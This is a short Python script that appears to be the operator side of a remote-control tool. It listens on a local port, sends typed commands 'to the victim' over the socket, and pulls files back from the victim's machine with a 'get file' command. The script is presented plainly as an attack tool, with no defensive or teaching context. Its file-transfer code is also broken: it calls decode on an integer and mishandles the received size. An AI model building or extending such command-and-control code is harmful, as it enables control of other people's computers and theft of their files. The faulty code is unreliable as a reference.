import socket


def server():
    s = socket.socket()
    s.bind(('127.0.0.1', 8965))

    s.listen(1)
    client_socket, adress = s.accept()
    print("Connection from: " + str(adress))
    while True:
        command = input('Please enter a command to the victim\n')
        client_socket.send(command.encode('utf-8'))
        if 'get file ' in command:
            size = client_socket.recv((1024).decode('utf-8'))
            print(size)
            data_2 = client_socket.recv((size).decode('utf-8'))
            file_path = input("Please enter the path of the file")
            with open(file_path, 'wb')as f:
                f.write(data_2)

        else:
            data = client_socket.recv(1024)
            print('From victim: ' + data.decode('utf-8'))

    client_socket.close()


if __name__ == '__main__':
    server()
